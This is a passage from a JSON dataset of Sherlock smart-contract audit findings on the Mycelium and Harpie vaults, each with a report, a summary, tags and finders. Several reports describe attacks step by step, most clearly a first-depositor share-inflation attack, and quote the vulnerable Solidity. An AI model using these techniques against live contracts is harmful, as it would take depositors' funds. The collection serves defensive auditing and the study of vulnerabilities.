      "finders": [
        "0x52",
        "bin2chen",
        "Ruhum",
        "WATCHPUG",
        "berndartmueller",
        "hansfriese",
        "dipp",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3401",
      "title": "M-1: When one of the plugins is broken or paused, `deposit()` or `withdraw()` of the whole Vault contract can malfunction",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/006-M \n\n## Found by \nctf\\_sec, IllIllI, berndartmueller, ak1, WATCHPUG\n\n## Summary\n\nOne malfunctioning plugin can result in the whole Vault contract malfunctioning.\n\n## Vulnerability Detail\n\nA given plugin can temporally or even permanently becomes malfunctioning (cannot deposit/withdraw) for all sorts of reasons.\n\nEg, Aave V2 Lending Pool can be paused, which will prevent multiple core functions that the Aave v2 plugin depends on from working, including `lendingPool.deposit()` and `lendingPool.withdraw()`.\n\nhttps://github.com/aave/protocol-v2/blob/master/contracts/protocol/lendingpool/LendingPool.sol#L54\n\n```soldity\n  modifier whenNotPaused() {\n    _whenNotPaused();\n    _;\n  }\n```\n\nhttps://github.com/aave/protocol-v2/blob/master/contracts/protocol/lendingpool/LendingPool.sol#L142-L146\n\n```solidity\n  function withdraw(\n    address asset,\n    uint256 amount,\n    address to\n  ) external override whenNotPaused returns (uint256) {\n```\n\nThat's because the deposit will always goes to the first plugin, and withdraw from the last plugin first.\n\n## Impact\n\nWhen Aave V2 Lending Pool is paused, users won't be able to deposit or withdraw from the vault.\n\nNeither can the owner remove the plugin nor rebalanced it to other plugins to resume operation.\n\nBecause withdrawal from the plugin can not be done, and removing a plugin or rebalancing both rely on this.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L456-L473\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L492-L519\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n1. Consider introducing a new method to pause one plugin from the Vault contract level;\n\n2. Aave V2's Lending Pool contract has a view function [`paused()`](https://github.com/aave/protocol-v2/blob/master/contracts/protocol/lendingpool/LendingPool.sol#L685), consider returning `0` for `availableForDeposit()` and ``availableForWithdrawal() when pool paused in AaveV2Plugin:\n\n```solidity\nfunction availableForDeposit() public view override returns (uint256) {\n    if (lendingPool.paused()) return 0;\n    return type(uint256).max - balance();\n}\n```\n\n```solidity\nfunction availableForWithdrawal() public view override returns (uint256) {\n    if (lendingPool.paused()) return 0;\n    return balance();\n}\n```",
      "summary": "\nThis bug report is about an issue found in the Vault contract, where a malfunctioning plugin can cause the whole contract to malfunction. The malfunctioning plugin can be paused or broken, and this prevents users from depositing or withdrawing funds from the Vault. The issue was found by ctf\\_sec, IllIllI, berndartmueller, ak1, and WATCHPUG.\n\nThe bug is caused by the fact that the deposit will always go to the first plugin, and withdrawal from the last plugin first. This means that when a plugin is malfunctioning, the Vault contract cannot be used as normal. Neither can the owner remove the plugin or rebalance it to other plugins to resume operation. This is because withdrawal from the plugin can not be done and removing a plugin or rebalancing both rely on this.\n\nThe code snippets in the report demonstrate this issue and the tools used to find it were manual review. Two recommendations are given to fix this issue. The first is to consider introducing a new method to pause one plugin from the Vault contract level. The second is to consider returning 0 for availableForDeposit() and availableForWithdrawal() when the pool is paused in AaveV2Plugin.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Mycelium",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/006-M",
      "tags": [
        "External Contract",
        "DOS",
        "Denial-Of-Service"
      ],
      "finders": [
        "IllIllI",
        "WATCHPUG",
        "berndartmueller",
        "ak1",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3400",
      "title": "H-1: Attacker can manipulate the pricePerShare to profit from future users' deposits",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/001-H \n\n## Found by \nRuhum, ctf\\_sec, cccz, joestakey, ellahi, \\_\\_141345\\_\\_, 8olidity, hansfriese, minhquanym, 0x52, caventa, rvierdiiev, Sm4rty, rbserver, IllIllI, sorrynotsorry, JohnSmith, defsec, WATCHPUG, berndartmueller, ak1\n\n## Summary\n\nBy manipulating and inflating the pricePerShare to a super high value, the attacker can cause all future depositors to lose a significant portion of their deposits to the attacker due to precision loss.\n\n## Vulnerability Detail\n\nA malicious early user can `deposit()` with `1 wei` of `LINK` token as the first depositor of the Vault, and get `(1 * STARTING_SHARES_PER_LINK) wei` of shares.\n\nThen the attacker can send `STARTING_SHARES_PER_LINK - 1` of `LINK` tokens and inflate the price per share from `1 / STARTING_SHARES_PER_LINK` to 1.0000 .\n\nThen the attacker call `withdraw()` to withdraw `STARTING_SHARES_PER_LINK - 1` shares, and send `1e22` of `LINK` token and inflate the price per share from 1.000 to 1.000e22.\n\nAs a result, the future user who deposits `9999e18` will only receive `0` (from `9999e18 * 1 / 10000e18`) of shares token.\n\nThey will immediately lose all of their deposits.\n\n## Impact\n\nUsers may suffer a significant portion or even 100% of the funds they deposited to the Vault.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L131-142\n\n```solidity\n    function deposit(uint256 _amount) external {\n        require(_amount > 0, \"Amount must be greater than 0\");\n        require(_amount <= availableForDeposit(), \"Amount exceeds available capacity\");\n\n        uint256 newShares = convertToShares(_amount);\n        _mintShares(msg.sender, newShares);\n\n        IERC20(LINK).transferFrom(msg.sender, address(this), _amount);\n        _distributeToPlugins();\n\n        emit Deposit(msg.sender, _amount);\n    }\n```\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L614-L620\n\n```solidity\n    function convertToShares(uint256 _tokens) public view returns (uint256) {\n        uint256 tokenSupply = totalSupply(); // saves one SLOAD\n        if (tokenSupply == 0) {\n            return _tokens * STARTING_SHARES_PER_LINK;\n        }\n        return _tokens.mulDivDown(totalShares, tokenSupply);\n    }\n```\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider requiring a minimal amount of share tokens to be minted for the first minter, and send part of the initial mints as a permanent reserve to the DAO/treasury/deployer so that the pricePerShare can be more resistant to manipulation.",
      "summary": "\nThis bug report is about an attacker being able to manipulate the pricePerShare in a smart contract to profit from future users' deposits. The vulnerability was found by a group of researchers, and it was discovered that the attacker can deposit a small amount of LINK token and inflate the pricePerShare to a super high value. This will cause all future depositors to lose a significant portion of their funds due to precision loss. The code snippet provided in the report shows how the attacker can exploit the vulnerability. The recommendation given in the report is to require a minimal amount of share tokens to be minted for the first minter, and send part of the initial mints as a permanent reserve to the DAO/treasury/deployer to make the pricePerShare more resistant to manipulation.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Mycelium",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/001-H",
      "tags": [
        "ERC4626",
        "Initial Deposit",
        "First Depositor Issue"
      ],
      "finders": [
        "0x52",
        "WATCHPUG",
        "berndartmueller",
        "ctf\\_sec",
        "rbserver",
        "minhquanym",
        "joestakey",
        "caventa",
        "Sm4rty",
        "IllIllI",
        "cccz",
        "sorrynotsorry",
        "Ruhum",
        "ellahi",
        "hansfriese",
        "ak1",
        "8olidity",
        "JohnSmith",
        "\\_\\_141345\\_\\_",
        "rvierdiiev",
        "defsec"
      ]
    },
    {
      "id": "3381",
      "title": "M-9: Nonces not used in signed data",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/160-M \n\n## Found by \nIllIllI\n\n## Summary\nNonces are not used in the signature checks\n\n## Vulnerability Detail\nA nonce can prevent an old value from being used when a new value exists. Without one, two transactions submitted in one order, can appear in a block in a different order\n\n## Impact\nIf a user is attacked, then tries to change the recipient address to a more secure address, initially chooses an insecure compromised one, but immediately notices the problem, then re-submits as a different, uncompromised address, a malicious miner can change the order of the transactions, so the insecure one is the one that ends up taking effect, letting the attacker transfer the funds\n\n## Code Snippet\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L67-L71\n\n## Tool used\n\nManual Review\n\n## Recommendation\nInclude a nonce in what is signed\n\n## Harpie Team\nFixed by changing nonce system to an incremental system. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/ee6f5cdf52fa5604d4693331189edff6558c9b8a).\n\n## Lead Senior Watson\nNot an issue AFAIK, miners can't reorder txs unless they are signed with the same nonce. There would have to be some serious mis-use of this function by the recipient address, i.e. they would have to ask the server to sign for two different addresses and then broadcast the txs with the same nonce for this call. The proposed fix could probably be safely removed but doesn't hurt to keep it there.",
      "summary": "\nThis bug report is about a vulnerability found in the code of the Harpie platform. The issue, M-9, is that nonces are not used in the signature checks. A nonce is a value that is used to prevent an old value from being used when a new value exists. Without one, two transactions submitted in one order can appear in a block in a different order, which can be exploited by malicious miners. In this case, if a user is attacked and then tries to change the recipient address to a more secure address, the malicious miner can reorder the transactions and the insecure address will take effect, allowing the attacker to transfer the funds. The Harpie team fixed this issue by changing the nonce system to an incremental system. Lead Senior Watson also concluded that this fix was not necessary, as miners can't reorder transactions unless they are signed with the same nonce.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/160-M",
      "tags": [
        "Nonce",
        "Replay Attack"
      ],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "3380",
      "title": "M-8: reduceERC721Fee function can not set fee when the NFT token ID is more than type(uint128).max",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/081-M \n\n## Found by \nak1\n\n## Summary\n`reduceERC721Fee` function can not set fee when the NFT token ID is more than `type(uint128).max`\n\n## Vulnerability Detail\nThe NFT token ID can be any value within uint 256.\nAs the reduceERC721Fee takes the `_id` argument as `uint 128`, when the reduceERC721Fee function is called with an NFT id that has above `type(uint128).max` , the fee can not set to the expected NFT id.\n\n## Impact\n`High :` RC721Fee can not  set fee when the NFT token ID value is more than `type(uint128).max`\n\n## Code Snippet\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L148\n\n## Tool used\nManual Review\n\n## Recommendation\nChange the function argument for `reduceERC721Fee` as shown below.\n`before fix :` function reduceERC721Fee(address _originalAddress, address _erc721Address, `uint128 _id,` uint128 _reduceBy) external returns (uint128)\n\n`after fix:` function reduceERC721Fee(address _originalAddress, address _erc721Address, `uint256 _id,` uint128 _reduceBy) external returns (uint128)\n\n## Lead Senior Watson\nGood find! ERC721 standard doesn't enforce how `tokenId` is implemented for a given NFT. Could definitely be greater than `uint128`, although I've never seen a case where this is true.\n\n## Harpie Team\nChanged to uint256. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/de97103372a8fcd7b45aaa1b21e06ba13b82bbc6). \n\n## Lead Senior Watson\nConfirmed fix.",
      "summary": "\nThis bug report is about the `reduceERC721Fee` function in the Harpieio/contracts repository. The function is unable to set fees when the NFT token ID is more than `type(uint128).max`. This is because the function takes the `_id` argument as `uint 128`, and the NFT id can be any value within uint 256. \n\nThe impact of this issue is high, as the RC721Fee can not be set when the NFT token ID value is more than `type(uint128).max`. The issue was found by ak1 and the code snippet and tool used for the audit can be found in the report.\n\nThe recommendation is to change the function argument for `reduceERC721Fee` from `uint128 _id` to `uint256 _id`. This fix was confirmed by Lead Senior Watson and the fix can be found [here](https://github.com/Harpieio/contracts/pull/4/commits/de97103372a8fcd7b45aaa1b21e06ba13b82bbc6).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/081-M",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "ak1"
      ]
    },
    {
      "id": "3379",
      "title": "M-7: Unsafe casting of user amount from `uint256` to `uint128`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/018-M \n\n## Found by \nLambda, Tomo, hickuphh3, IllIllI, defsec, sirhashalot\n\n## Summary\n\nThe unsafe casting of the recovered amount from `uint256` to `uint128` means the users’ funds will be lost.\n\n## Vulnerability Detail\n\n`logIncomingERC20()` has the recovered amount as type `uint256`, but `amountStored` is of type `uint128`. There is an unsafe casting when incrementing `amountStored`:\n\n```solidity\n_erc20WithdrawalAllowances[_originalAddress][_erc20Address].amountStored += uint128(_amount);\n```\n\nIt is thus possible for the amount recorded to be less than the actual amount recovered.\n\n## Impact\n\nLoss of funds.\n\n## Proof of Concept\n\nThe user's balance is `type(uint128).max = 2**128`, but the incremented amount will be zero.\n\n## Recommendation\n\n`amountStored` should be of type `uint256`. Alternatively, use [OpenZeppelin’s SafeCast library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeCast) when casting from `uint256` to `uint128`.\n\n## Lead Senior Watson\nNot sure, any tokens which would have a token supply over `type(uint128).max` but I guess it's best to be proactive. The proposed fix does create some issues. Instead of having less tokens transferred to the vault, the contract will revert and prevent the transfer entirely. Arguably more funds would be at risk, so you may as well use `uint256` then or accept the risk and keep the slot packing.\n\n## Harpie Team\nDecided to accept the risk of reverts on leastwood's comment on this issue since it's a lot of gas savings and there probably arent useful tokens w/ supply over (uint128).max. Used @openzeppelin/SafeCast. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/1ff8c0482c690fd44558adb15cb40515623ac5cd).\n\n## Lead Senior Watson\nConfirmed fix.",
      "summary": "\nThe bug report is about an unsafe casting of user amount from `uint256` to `uint128` in `logIncomingERC20()` which can lead to a loss of funds. The user's balance is `type(uint128).max = 2**128`, but the incremented amount will be zero. The bug was found by Lambda, Tomo, hickuphh3, IllIllI, defsec, and sirhashalot. \n\nThe recommended fix was to make `amountStored` of type `uint256` or use OpenZeppelin's SafeCast library when casting from `uint256` to `uint128`. The Harpie team decided to accept the risk of reverts and used the SafeCast library. The Lead Senior Watson confirmed the fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/018-M",
      "tags": [
        "Type casting"
      ],
      "finders": [
        "sirhashalot",
        "IllIllI",
        "hickuphh3",
        "Lambda",
        "Tomo",
        "defsec"
      ]
    },
    {
      "id": "3378",
      "title": "M-6: Signature malleability not protected against",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/010-M \n\n## Found by \n0xNazgul, pashov, IllIllI, ladboy233, defsec, sirhashalot\n\n## Summary\nOpenZeppelin has a vulnerability in versions lower than 4.7.3, which can be exploited by an attacker. The project uses a vulnerable version\n\n## Vulnerability Detail\nAll of the conditions from the advisory are satisfied: the signature comes in a single `bytes` argument, `ECDSA.recover()` is used, and the signatures themselves are used for replay protection checks\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h\n\nIf a user calls `changeRecipientAddress()`, notices a mistake, then calls `changeRecipientAddress()` again, an attacker can use signature malleability to re-submit the first change request, as long as the old request has not expired yet.\n\n## Impact\nThe wrong, potentially now-malicious, address will be the valid change recipient, which could lead to the loss of funds (e.g. the attacker attacked, the user changed to another compromised address, noticed the issue, then changed to a whole new account address, but the attacker was able to change it back and withdraw the funds to the unprotected address).\n\n## Code Snippet\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/package.json#L23\n\n## Tool used\n\nManual Review\n\n## Recommendation\nChange to version 4.7.3\n\n## Lead Senior Watson\nGood find and the fix seems straightforward. Upgrade OZ.\n\n## Harpie Team\nUpdated openzeppelin NPM package to do ECDSA 4.7.3. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/74e54edfe43480f71d30acac578627c38366ffa6).\n\n## Lead Senior Watson\nConfirmed fix.",
      "summary": "\nThis bug report is about a vulnerability in OpenZeppelin versions lower than 4.7.3, which can be exploited by an attacker. It is caused by signature malleability which can be used to resubmit a change request if the old request has not expired yet. This can lead to the loss of funds if the wrong address is set as the change recipient. The vulnerability was discovered by 0xNazgul, pashov, IllIllI, ladboy233, defsec, and sirhashalot. The code snippet responsible for the bug can be found at https://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/package.json#L23. The bug was identified using manual review. The recommended solution is to upgrade to version 4.7.3. The fix was confirmed by Lead Senior Watson and the Harpie Team, who updated the openzeppelin NPM package to do ECDSA 4.7.3, the fix for which can be found at https://github.com/Harpieio/contracts/pull/4/commits/74e54edfe43480f71d30acac578627c38366ffa6.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/010-M",
      "tags": [
        "Signature Malleability",
        "ECDSA"
      ],
      "finders": [
        "sirhashalot",
        "pashov",
        "0xNazgul",
        "IllIllI",
        "ladboy233",
        "defsec"
      ]
    },
    {
      "id": "3377",
      "title": "M-5: There is no limit on the amount of fee users have to pay",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/008-M \n\n## Found by \nhickuphh3, 0xSmartContract, xiaoming90, ak1, minhquanym, leastwood, defsec, HonorLt\n\n## Summary\n\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Transfer.sol#L57\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Transfer.sol#L88\n\n## Vulnerability Detail\n\nThere is no upper limit on the amount of fee users have to pay to withdraw their funds back. So any EOA can call transfer function on `Transfer` contract can set an unreasonable amount of fee and users have to pay it if they want their funds back. We need to make sure that users' funds cannot be loss even when the protocol acts maliciously. \n\n## Impact\n\nIn case the protocol acts maliciously and set `fee = 1e18` to transfer users' fund to `Vault`, users cannot withdraw their funds since fee is too high.\n\n## Proof of Concept\n\nIn both `transferERC20()` and `transferERC721()`, EOA is caller and can set `fee` param to any value it wants. \n```solidity\nfunction transferERC721(address _ownerAddress, address _erc721Address, uint256 _erc721Id, uint128 _fee) public returns (bool) {\n      require(_transferEOAs[msg.sender] == true || msg.sender == address(this), \"Caller must be an approved caller.\");\n      require(_erc721Address != address(this));\n      (bool transferSuccess, bytes memory transferResult) = address(_erc721Address).call(\n          abi.encodeCall(IERC721(_erc721Address).transferFrom, (_ownerAddress, vaultAddress, _erc721Id))\n      );\n      require(transferSuccess, string (transferResult));\n      (bool loggingSuccess, bytes memory loggingResult) = address(vaultAddress).call(\n          abi.encodeCall(Vault.logIncomingERC721, (_ownerAddress, _erc721Address, _erc721Id, _fee))\n      );\n      require(loggingSuccess, string (loggingResult));\n      emit successfulERC721Transfer(_ownerAddress, _erc721Address, _erc721Id);\n      return transferSuccess;\n  }\n```\n\nAnd users need to send enough fee (native token) to withdraw their fund back on `Vault`\n```solidity\nfunction withdrawERC721(address _originalAddress, address _erc721Address, uint256 _id) payable external {\n      require(_recipientAddress[_originalAddress] == msg.sender, \"Function caller is not an authorized recipientAddress.\");\n      require(_erc721Address != address(this), \"The vault is not a token address\");\n      require(canWithdrawERC721(_originalAddress, _erc721Address, _id), \"Insufficient withdrawal allowance.\");\n      require(msg.value >= _erc721WithdrawalAllowances[_originalAddress][_erc721Address][_id].fee, \"Insufficient payment.\");\n\n      _erc721WithdrawalAllowances[_originalAddress][_erc721Address][_id].isStored = false;\n      _erc721WithdrawalAllowances[_originalAddress][_erc721Address][_id].fee = 0;\n      IERC721(_erc721Address).transferFrom(address(this), msg.sender, _id);\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding an upper limit on the amount of fee users need to pay\n\n## Lead Senior Watson\n\nCurrently there is no way to revoke a change fee controller request. I'd shy away from using a mapping, adds unnecessary overhead when it can be handled by a `pendingFeeController` variable. Also important to note that mapping in `changeFeeController()` is not cleared.\n\n## Harpie Team\n\nUsing leastwood's suggestion of a timelock for feeController. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/9b75a000f6cb0798e650f1433012b2b52f7a0e2b). Supplementary fixes for this issue: \n[1](https://github.com/Harpieio/contracts/pull/4/commits/c60dc166aab6f7067379ea3f1e39be2ae17cc2dc), \n[2](https://github.com/Harpieio/contracts/pull/4/commits/ea97548c379ec9b48e42724a52a1ee7bd4cce6b7), \n[3](https://github.com/Harpieio/contracts/pull/4/commits/8cfc07577c49eb0b0713fb5499ea9313153c2c7c). \n\n## Lead Senior Watson\n\nConfirmed fixes.",
      "summary": "\nThis bug report is about an issue found in the Transfer.sol contract of the Harpieio/contracts repository. The issue is that there is no upper limit on the amount of fee users have to pay to withdraw their funds back. This means that any external account (EOA) can call the transfer function and set an unreasonable amount of fee, which users would have to pay if they want their funds back. This could lead to users losing their funds if the protocol acts maliciously and sets the fee to an unreasonably high amount.\n\nThe bug was found by hickuphh3, 0xSmartContract, xiaoming90, ak1, minhquanym, leastwood, defsec, and HonorLt. It was confirmed by Lead Senior Watson. \n\nThe proof of concept for the bug was that in both transferERC20() and transferERC721(), the EOA is the caller and can set the fee param to any value it wants. And users have to send enough fee (native token) to withdraw their funds back on Vault.\n\nThe recommendation for the bug is to consider adding an upper limit on the amount of fee users need to pay. The Harpie Team then implemented this recommendation with the help of leastwood's suggestion of a timelock for feeController. This was done through 3 supplementary fixes, which were confirmed by Lead Senior Watson.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/008-M",
      "tags": [],
      "finders": [
        "minhquanym",
        "leastwood",
        "hickuphh3",
        "xiaoming90",
        "0xSmartContract",
        "ak1",
        "HonorLt",
        "defsec"
      ]
    },
    {
      "id": "3376",
      "title": "M-4: Usage of deprecated transfer() can result in revert.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/007-M \n\n## Found by \nLambda, cccz, yixxas, Waze, IEatBabyCarrots, pashov, 0xSmartContract, JohnSmith, Tomo, CodingNameKiki, sach1r0, IllIllI, csanuragjain, gogo\n\n## Summary\nThe function withdrawPayments() is used by the Owners to withdraw the fees.\n\n## Vulnerability Detail\ntransfer() uses a fixed amount of gas, which was used to prevent reentrancy. However this limit your protocol to interact with others contracts that need more than that to process the transaction.\n\nSpecifically, the withdrawal will inevitably fail when:\n1.The withdrawer smart contract does not implement a payable fallback function.\n2.The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.\n3.The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.\n\n## Impact\ntransfer() uses a fixed amount of gas, which can result in revert.\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n\n## Code Snippet\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L159\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L156-L160\n\n## Tool used\n\nManual Review\n\n## Recommendation\nUse call instead of transfer(). Example:\n(bool succeeded, ) = _to.call{value: _amount}(\"\");\nrequire(succeeded, \"Transfer failed.\");\n\n## Lead Senior Watson\n\nFair considering recipient may be a contract with custom logic for `receive()`. But this is definitely recoverable if the fee recipient wasn't able to receive funds.\n\n## Harpie Team\n\nMoved to .call. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/655834654b5dc1225e9d2fcd2c07b00401aeac3b). \n\n## Lead Senior Watson\n\nConfirmed fix.",
      "summary": "\nThis bug report is about an issue found in the withdrawPayments() function of the Vault.sol contract. It was found by Lambda, cccz, yixxas, Waze, IEatBabyCarrots, pashov, 0xSmartContract, JohnSmith, Tomo, CodingNameKiki, sach1r0, IllIllI, csanuragjain, and gogo. The issue is that the function uses the deprecated transfer() which can result in a revert due to a fixed amount of gas. This can happen if the withdrawer smart contract does not implement a payable fallback function, or if it does but uses more than 2300 gas units, or if it needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300. The impact of this bug is that funds may not be received by the fee recipient.\n\nThe bug was fixed by using call instead of transfer(). A code snippet was provided, as well as a link to a pull request with the fix. Lead Senior Watson confirmed the fix.",
      "quality_score": 2.001075122243043,
      "rarity_score": 1.0014334963240574,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/007-M",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "pashov",
        "gogo",
        "yixxas",
        "cccz",
        "Waze",
        "0xSmartContract",
        "CodingNameKiki",
        "Lambda",
        "JohnSmith",
        "sach1r0",
        "Tomo",
        "IEatBabyCarrots"
      ]
    },
    {
      "id": "3375",
      "title": "M-3: Incompatability with deflationary / fee-on-transfer tokens",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/005-M \n\n## Found by \nLambda, cccz, hansfriese, IEatBabyCarrots, rbserver, JohnSmith, minhquanym, Tomo, leastwood, dipp, defsec, HonorLt, IllIllI, saian, csanuragjain\n\n## Summary\n\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Transfer.sol#L93-L100\n\nIn case ERC20 token is fee-on-transfer, Vault can loss funds when users withdraw\n\n## Vulnerability Detail\n\nIn `Transfer.transferERC20()` function, this function called `logIncomingERC20()` with the exact amount used when it called `safeTransferFrom()`. In case ERC20 token is fee-on-transfer, the actual amount that Vault received may be less than the amount is recorded in `logIncomingERC20()`. \n\nThe result is when a user withdraws his funds from `Vault`, Vault can be lost and it may make unable for later users to withdraw their funds.\n\n## Proof of Concept\n\nConsider the scenario\n1. Token X is fee-on-transfer and it took 10% for each transfer. Alice has 1000 token X and Bob has 2000 token X\n2. Assume that both Alice and Bob are attacked. Harpie transfers all token of Alice and Bob to Vault. It recorded that the amount stored for token X of Alice is 1000 and Bob is 2000. But since token X has 10% fee, Vault only receives 2700 token X.\n3. Now Bob withdraw his funds back. With `amountStored = 2000`, he will transfer 2000 token X out of the Vault and received 1800. \n4. Now the Vault only has 700 token X left and obviously it's unable for Alice to withdraw\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider calculating the actual amount Vault received to call `logIncomingERC20()`\nTransfer the tokens first and compare pre-/after token balances to compute the actual transferred amount.\n\n## Harpie Team\n\nUsing difference in balance in vault rather than token transfer amount. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/550065a5e9d625ef93a862bc5f74f140d57998fa).\n\n## Lead Senior Watson\n\nWhile it's true the fix does allow for compatabiliy with fee-on-transfer tokens, it does not correctly handle rebasing tokens. Might be useful to explicily note that rebasing tokens are not supported or instead you could adopt mint shares to represent the ownership over the vault's tokens.\n\n## Harpie Team\n\nOn rebasing tokens, we just won't be able to support them for now.",
      "summary": "\nThis bug report discusses an incompatibility issue between Harpie's Vault and deflationary/fee-on-transfer tokens. The issue is that when users withdraw their funds from the Vault, the Vault can lose funds and make it impossible for later users to withdraw their funds. The reason for this is that the Vault records the exact amount used when it called the `safeTransferFrom()` function, but if the ERC20 token is fee-on-transfer, the actual amount that the Vault receives may be less than the amount recorded.\n\nTo prove this concept, a scenario was provided in which Alice and Bob both have different amounts of a fee-on-transfer token, and Harpie transfers all of their tokens to the Vault. Because of the fee, the Vault only receives 2700 token X, and when Bob withdraws his funds, the Vault only has 700 token X left and Alice is unable to withdraw.\n\nThe Harpie team provided a fix that allows for compatibility with fee-on-transfer tokens, but Lead Senior Watson noted that it does not correctly handle rebasing tokens. The Harpie team decided that for now, rebasing tokens cannot be supported.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/005-M",
      "tags": [
        "Weird ERC20",
        "Fee On Transfer"
      ],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "rbserver",
        "cccz",
        "minhquanym",
        "leastwood",
        "Lambda",
        "saian",
        "JohnSmith",
        "hansfriese",
        "dipp",
        "HonorLt",
        "Tomo",
        "IEatBabyCarrots",
        "defsec"
      ]
    },
    {
      "id": "3374",
      "title": "M-2: Cross-chain replay attacks are possible with `changeRecipientAddress()`",
      "impact": "MEDIUM",
